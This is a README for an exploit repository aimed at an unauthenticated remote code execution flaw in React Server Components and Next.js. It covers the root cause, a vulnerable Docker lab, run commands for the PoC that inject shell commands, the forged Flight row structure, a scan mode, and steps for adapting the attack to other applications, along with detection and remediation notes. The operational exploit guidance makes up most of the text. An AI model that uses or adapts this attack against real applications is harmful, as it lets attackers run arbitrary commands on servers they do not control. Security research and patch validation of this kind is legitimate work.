# GHSA-xqc2-xf4c-x3h3 — React Server Components RCE PoC

> **Research exploit code.** This repository contains a working proof of concept
> and an intentionally vulnerable Docker lab. Use it only against systems you
> own or have explicit written permission to test.

A minimal Python PoC and Docker lab for the unauthenticated remote code
execution in React Server Components tracked as
[GHSA-xqc2-xf4c-x3h3](https://github.com/react/react/security/advisories/GHSA-xqc2-xf4c-x3h3)
(React) and
[GHSA-673q-mjm6-r5xr](https://github.com/vercel/next.js/security/advisories/GHSA-673q-mjm6-r5xr)
(Next.js).

## At a glance

| | |
|---|---|
| **Severity** | Critical — CVSS v4 9.5 |
| **Attack vector** | Network, unauthenticated, no user interaction |
| **React packages** | `react-server-dom-webpack`, `-parcel`, `-turbopack` |
| **Affected React** | `19.0.0–19.0.8`, `19.1.0–19.1.9`, `19.2.0–19.2.8`, `19.3.0` |
| **Fixed React** | `19.0.9`, `19.1.10`, `19.2.9`, `19.3.1` |
| **Affected Next.js** | `>= 16.0.0, <= 16.4.0` (App Router + Cache Components) |
| **Fixed Next.js** | `16.4.1` |
| **CVE** | None assigned at time of writing |
| **Prerequisite** | A `use cache` function that returns multiple typed arrays plus an attacker-controlled value |

The React advisory describes the trigger as “extremely rare cases where
responses transport multiple typed arrays and an attacker-controlled value.”
The PoC reproduces exactly that layout.

## Root cause

The Flight serializer handles multiple typed-array views over one shared
`ArrayBuffer`. On the vulnerable versions:

1. The first view causes the shared buffer to be transferred/detached.
2. A later view is serialized with its length header but **no payload**.
3. When the cached stream is read back, the decoder consumes the declared
   length, over-reads into caller-supplied bytes, and resumes parsing there.
4. Forged Flight rows at that resume offset invoke a real Server Action with
   attacker-chosen arguments.

The vulnerability is in the RSC serializer/deserializer, not in a custom API
route. The PoC does not need a multipart POST or a `Next-Action` header.

## Repository layout

| Path | Purpose |
|---|---|
| `poc.py` | Dependency-free Python 3.8+ PoC: action discovery, payload construction, request, result parsing |
| `lab/` | Next.js 16.4.0 + React 19.3.0 Docker lab that triggers the desync |
| `compose.yaml` | Optional Compose setup for the vulnerable and patched labs |
| `Makefile` | Shortcuts for building, running, and checking the PoC |

## Requirements

- PoC: Python 3.8+, standard library only
- Lab: Docker
- Lab runtime: Node.js 22 (handled by the container image)

## Quick start

Build and run the vulnerable lab:

```bash
docker build -t ghsa-xqc2-lab ./lab
docker run --rm -p 127.0.0.1:3100:3100 ghsa-xqc2-lab
```

In another terminal:

```bash
python3 poc.py http://127.0.0.1:3100 --cmd 'id; uname -a'
```

Expected:

```text
[*] action id: <hex>
[*] blob: <n> bytes, forged rows at offset 8184, args=['id; uname -a']
[*] HTTP 200
[+] Server Action executed with attacker-chosen arguments
================ action output ================
uid=... 
...
==============================================
```

The lab action runs its argument through `/bin/sh`, so `--cmd` is the command
you want to prove. Against a real application, `--cmd` must be whatever that
application's Server Action expects; the PoC reaches the action, and the action
decides what the argument means.

The lab also exposes `GET /api/payload` as a desync check:

- vulnerable build: `500 {"ok":false,"error":"Connection closed."}`
- patched build: `200` with both 8 KB blocks intact

### Compose alternative

```bash
docker compose up --build lab                 # vulnerable on 127.0.0.1:3100
docker compose --profile patched up --build lab-patched  # patched on 127.0.0.1:3101
```

## Verify the patched build

Build the same lab with the fixed Next.js version:

```bash
docker build --build-arg NEXT_VERSION=16.4.1 -t ghsa-xqc2-lab-patched ./lab
docker run --rm -p 127.0.0.1:3101:3100 ghsa-xqc2-lab-patched
```

Then:

```bash
python3 poc.py http://127.0.0.1:3101 --cmd id
# [-] blob stayed opaque (Uint8Array(...)); target appears patched
```

Tested locally: `next@16.4.0` + `react@19.3.0` returns the action output;
`next@16.4.1` leaves the blob opaque and no action runs.

## PoC usage

```text
python3 poc.py <url> [options]
```

| Option | Description |
|---|---|
| `--cmd <string>` | Argument passed to the target Server Action (default: `id`) |
| `--args-json <json>` | JSON array of action arguments; overrides `--cmd` |
| `--action-id <hex>` | Explicit Server Action id; skips discovery |
| `--path <path>` | Page whose cached lookup accepts `?annotation=` (default: `/`) |
| `--chunk-id <id>` | Flight chunk id of the caller-influenced value (default: `4`, lab layout) |
| `--overread <n>` | Bytes consumed after the dropped view (default: `8192`, lab layout) |
| `--scan` | Try common chunk ids and overread sizes |
| `--chunk-ids <list>` | Chunk ids for `--scan` (default: `1-8`) |
| `--overreads <list>` | Overread sizes for `--scan` |
| `--timeout <sec>` | Network timeout (default: `30`) |
| `--insecure` | Do not verify TLS certificates |

## How the PoC works

1. **Discover the action id.** Reads the page and its client chunks for
   `$ACTION_ID_…` or `createServerReference(..., "<hex>")`.
2. **Build the blob.** Fills `annotation` with bytes placed at
   `overread - len("<chunk>:o<hexlen>,")`, using a fixed-point loop because the
   header length changes the resume offset. The defaults (`4`, `8192`) match
   the lab; use `--chunk-id` and `--overread` for a different cached layout.
3. **Forge rows.** `6:["<cmd>"]`, `5:{"id":"<action>","bound":"$@6"}`,
   `4:{"then":"$h5"}`. The cached value becomes a thenable whose `then` is the
   real Server Action.
4. **Request** `GET /?annotation=<base64>` and read the action output from the
   rendered `<pre>` summary.

## Adapting to another app

GHSA-xqc2 does not affect every Next.js app. The application must have a
`use cache` function that returns multiple typed arrays in a way that triggers
the serializer desync, and the cached page must be able to resolve a Server
Action.

- **Action ID:** discovered automatically from the page or its client chunks.
- **Chunk id and overread:** with source access, read them from the cached
  function's return order and the dropped view's byte length. Without source,
  `--scan` tries chunk ids `1-8` and common view sizes; add unusual sizes with
  `--overreads`.
- **Action arguments:** inspect the client component that calls the action,
  then pass the same shape with `--args-json`.

## Detection

- Request logs: an unusually long base64 `annotation` query parameter on a page
  request.
- The response body contains a `<pre>` block with serialized Server Action
  output.
- HTML or client chunks expose `$ACTION_ID_…` or
  `createServerReference(..., "<hex>")`.
- Check installed RSC builds for the fix marker:

  ```bash
  grep -c getBackingBlob \
    node_modules/next/dist/compiled/react-server-dom-webpack/cjs/react-server-dom-webpack-server.node.production.js
  # 0 = vulnerable; > 0 = fixed
  ```

## Remediation

- Upgrade Next.js to **16.4.1** or later.
- Upgrade the RSC packages to a fixed release: **19.0.9**, **19.1.10**,
  **19.2.9**, **19.3.1**, or later.
- If an immediate upgrade is not possible, remove `use cache` functions that
  return multiple typed arrays alongside attacker-controlled values, and audit
  Server Action authorization.
- Apps that do not use a React server, or that do not use a framework, bundler,
  or bundler plugin supporting RSC, are not affected.

## References

- React advisory: <https://github.com/react/react/security/advisories/GHSA-xqc2-xf4c-x3h3>
- Next.js advisory: <https://github.com/vercel/next.js/security/advisories/GHSA-673q-mjm6-r5xr>
- Next.js security update: <https://nextjs.org/blog/nextjs-security-update-october-14-2026>
- Next.js fix commit: <https://github.com/vercel/next.js/commit/a4cea6aec5da89d116b8960e113189cf51745d2f>

## Credits

- Vulnerability finder credited in the React advisory: [@evolutionstorm](https://github.com/evolutionstorm).
- This PoC and lab were independently written to validate the documented
  mechanism. A public reference exploit was used only to cross-check the wire
  format.

## Safety and license

This code is provided for authorized security testing, defensive validation,
and research. Do not use it against systems you do not own or lack written
permission to test. The lab is intentionally vulnerable; run it on an isolated
host or loopback only.

**No license is granted.** Copyright (c) 2026 briskets. All rights reserved.
